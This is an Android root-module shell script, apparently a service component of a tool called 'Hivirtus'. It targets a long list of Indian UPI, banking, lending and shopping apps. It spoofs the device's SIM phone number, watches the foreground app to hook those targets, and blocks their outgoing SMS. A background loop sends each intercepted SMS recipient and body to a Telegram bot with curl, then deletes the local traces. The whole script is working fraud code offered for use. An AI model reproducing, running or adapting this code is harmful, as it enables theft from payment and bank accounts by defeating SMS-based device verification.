#!/system/bin/sh
# Hivirtus runtime — config sync + SMS block + Telegram (APK-free native overlay)

MODDIR=${0%/*}
. "$MODDIR/overlay_install.sh"

CONFIG="$MODDIR/config.json"
RUNTIME="/data/local/tmp/hivirtus_zygisk_mode_config.json"
ACTIVE_PKG="/data/local/tmp/hivirtus_active_hook_pkg.txt"

UPI_PACKAGES="
com.phonepe.app
net.one97.paytm
com.google.android.apps.nbu.paisa.user
com.yespay.next
com.yesbank.yespay
com.yesbank.yespaynext
com.snapmint.customerapp
com.tataneu
com.stashfin.android
com.kreditbee.android
com.dreamplug.androidapp
com.mobikwik_new
com.freecharge.android
in.org.npci.upiapp
com.amazon.mShop.android.shopping
com.popclub.android
com.myairtelapp
com.jio.myjio
com.csam.icici.bank.imobile
com.sbi.lotusintouch
com.axis.mobile
com.hdfcbank.payzapp
com.bankofbaroda.mpassbook
com.idfcfirstbank.mobile
com.kotak811mobilebankingapp
com.whizdm.moneyview.loans
com.naviapp
com.bharatpe.app
com.rapipay
com.fampay.in
com.slice.app
com.postpe.app
com.olacabs.customer
com.application.zomato
in.swiggy.android
com.meesho.supply
com.flipkart.android
com.lazypay.app
com.earlysalary.android
com.whiz.credit
com.zestmoney.android
com.payu.india
com.msf.angelmobile
com.groww.app
com.nextbillion.groww
com.herofincorp.diyjourneys
com.herofincorp.simplycash
com.customer.herofincorp
com.paytmmoney
com.jar.app
com.supermoney
com.epifi.paisa
com.angelbroking.angelone
com.mmt.mmtpay
com.irctc.air
com.truecaller
com.whatsapp
com.samsung.android.spay
com.navi.moneymanager
com.loan.front
com.buddyloan.app
com.rupilo.android
com.moneytap.app
com.paysense.android
com.branch_international.branch.branch_demo_android
com.cashfree
com.razorpay.payments
com.mpokket.app
com.cashe.android
com.rupeeredee.app
com.loan.tap
com.smartcoin
com.kissht.android
com.flexsalary
com.nira.finance
com.availfinance
com.indialends.android
com.homecredit
com.bajajfinserv
com.hdbfs.hdbfsl
in.medibuddy
"

is_upi_pkg() {
  echo "$UPI_PACKAGES" | grep -qx "$1"
}

sync_config() {
  # Runtime JSON overwrite mat karo (telegram wipe) — sirf spoof phone + first-boot seed
  # Promote HTML Save → runtime so Zygisk hooks pick up without app restart
  if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
    SAVE=/data/local/tmp/hivirtus_ui_save.json
    if [ -f "$RUNTIME" ]; then
      # Keep runtime; overlay key fields from save via simple replace of known keys
      for key in enable_sim1_mock enable_phone_spoof enable_virtual_sim intercept_fake_success \
                 hook_outgoing_sms prefix_enabled override_incoming_sender auto_forward_token \
                 fake_intercept_telegram; do
        val=$(grep -o "\"$key\"[[:space:]]*:[[:space:]]*[^,}]*" "$SAVE" 2>/dev/null | head -n1 | sed 's/.*:[[:space:]]*//')
        if [ -n "$val" ]; then
          if grep -q "\"$key\"" "$RUNTIME" 2>/dev/null; then
            sed -i "s/\"$key\"[[:space:]]*:[[:space:]]*[^,}]*/\"$key\": $val/" "$RUNTIME" 2>/dev/null
          fi
        fi
      done
      for key in mock_phone_sim1 prefix_text inject_sender_id telegram_bot_token telegram_chat_id; do
        val=$(grep -o "\"$key\"[[:space:]]*:[[:space:]]*\"[^\"]*\"" "$SAVE" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
        if [ -n "$val" ] || grep -q "\"$key\"" "$SAVE" 2>/dev/null; then
          if grep -q "\"$key\"" "$RUNTIME" 2>/dev/null; then
            sed -i "s/\"$key\"[[:space:]]*:[[:space:]]*\"[^\"]*\"/\"$key\": \"$val\"/" "$RUNTIME" 2>/dev/null
          fi
        fi
      done
    else
      cp -f "$SAVE" "$RUNTIME" 2>/dev/null
    fi
    chmod 644 "$RUNTIME" 2>/dev/null
  fi

  SRC=""
  if [ -f "$RUNTIME" ]; then
    SRC="$RUNTIME"
  elif [ -f "$CONFIG" ]; then
    SRC="$CONFIG"
    cp -f "$CONFIG" "$RUNTIME"
    chmod 644 "$RUNTIME" 2>/dev/null
  fi
  if [ -n "$SRC" ]; then
    SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -n "$SPOOF_PHONE" ]; then
      echo "$SPOOF_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
      echo "$SPOOF_PHONE" > "$MODDIR/spoof_phone.txt"
      chmod 644 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
      chmod 644 "$MODDIR/spoof_phone.txt" 2>/dev/null
    fi
  fi
}

get_foreground_pkg() {
  local pkg

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'topResumedActivity=ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'mResumedActivity: ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'ResumedActivity' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  echo "$pkg"
}

mark_active() {
  hivirtus_mark_foreground_upi "$1"
}

sync_config

# NEVER seed APatch package_config (phone/telephony exclude=0 → SIM crash)
# NEVER mass-seed hooked_pkgs from csv

# Boot: repair SIM/settings + safe overlay only
MODDIR="$MODDIR" hivirtus_boot_activate_overlay
hivirtus_grant_overlay_permission &

# Keep bridge.dex + UI readable for app uid (SELinux-safe path)
(
  while true; do
    if [ -f "$MODDIR/bridge.dex" ]; then
      cp -f "$MODDIR/bridge.dex" /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
      chmod 644 /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
    fi
    if [ -d "$MODDIR/ui" ]; then
      mkdir -p /data/local/tmp/hivirtus_ui 2>/dev/null
      cp -f "$MODDIR/ui/"* /data/local/tmp/hivirtus_ui/ 2>/dev/null
      chmod 644 /data/local/tmp/hivirtus_ui/* 2>/dev/null
    fi
    sleep 60
  done
) &

(
  LAST=""
  while true; do
    sync_config
    FG=$(get_foreground_pkg)
    if [ -n "$FG" ] && is_upi_pkg "$FG"; then
      if [ "$FG" != "$LAST" ]; then
        mark_active "$FG"
        hivirtus_grant_overlay_permission "$FG"
        LAST="$FG"
      fi
    fi
    sleep 2
  done
) &

# DISABLED: appops SEND_SMS deny — system/SIM break + "sab apps hooked" feel
# SMS intercept sirf Zygisk client hook se (UPI process me)
enforce_sms_block() { return 0; }

seed_hooked_pkgs() { return 0; }
seed_apatch_config() { return 0; }

read_tg_creds() {
  TG_TOKEN=""
  TG_CHAT=""
  for f in /data/local/tmp/hivirtus_telegram_credentials.json \
    "$MODDIR/telegram_credentials.json" \
    "$RUNTIME" "$CONFIG"; do
    [ -f "$f" ] || continue
    [ -z "$TG_TOKEN" ] && TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
  done
}

read_blocked_sms() {
  BLOCKED_DEST=""
  BLOCKED_BODY=""
  if [ -f /data/local/tmp/hivirtus_outgoing_blocked.json ]; then
    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
  fi
  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_outgoing_blocked.flag ]; then
    BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
    BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
  fi
}

tg_json_escape() {
  printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' -e 's/\r/\\r/g' | awk 'BEGIN{ORS=""} {gsub(/\n/,"\\n"); print}'
}

tg_clip_copy() {
  printf '%s' "$1" | head -c 256
}

forward_blocked_telegram() {
  read_blocked_sms
  [ -z "$BLOCKED_BODY" ] && return 0
  read_tg_creds
  [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
  [ -z "$SPOOF" ] && SPOOF=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  SEND_FROM="${SPOOF:-—}"
  TEXT="📱 SMS Intercepted
Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥
-----------------
To:
${BLOCKED_DEST}

Message:
${BLOCKED_BODY}"
  ONE_TAP="${BLOCKED_DEST} | ${BLOCKED_BODY}"
  ESC_TEXT=$(tg_json_escape "$TEXT")
  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
  COPY_BODY=$(tg_clip_copy "$BLOCKED_BODY")
  ESC_BODY=$(tg_json_escape "$COPY_BODY")
  PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📋 Copy SMS Body\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
  SENT=0
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -H "Content-Type: application/json" \
      --data-binary "@${PAYLOAD}" >/dev/null 2>&1 && SENT=1
  fi
  if [ "$SENT" = "1" ]; then
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
    rm -f "$PAYLOAD"
  fi
}

seed_hooked_pkgs() { return 0; }
seed_apatch_config() { return 0; }

(
  while true; do
    forward_blocked_telegram
    sleep 2
  done
) &

(
  while true; do
    hivirtus_repair_sim_settings
    sleep 180
    hivirtus_grant_overlay_permission
    sleep 60
  done
) &
